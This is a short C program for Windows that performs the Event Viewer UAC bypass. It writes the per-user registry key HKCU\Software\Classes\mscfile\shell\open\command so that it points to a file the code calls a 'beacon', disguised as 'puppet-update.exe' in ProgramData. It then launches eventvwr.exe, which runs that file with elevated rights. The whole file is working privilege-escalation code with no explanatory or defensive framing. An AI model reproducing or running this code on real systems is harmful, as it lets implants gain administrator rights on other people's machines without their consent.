#include <windows.h>

int main() {
    HKEY hKey;
    const char* keyPath = "Software\\Classes\\mscfile\\shell\\open\\command";
    const char* beaconPath = "C:\\programdata\\puppet\\puppet-update.exe";

    if (RegCreateKeyA(HKEY_CURRENT_USER, keyPath, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)beaconPath, strlen(beaconPath) + 1);
        RegCloseKey(hKey);
    }

    ShellExecuteA(NULL, "open", "eventvwr.exe", NULL, NULL, SW_SHOWDEFAULT);

    return 0;
}
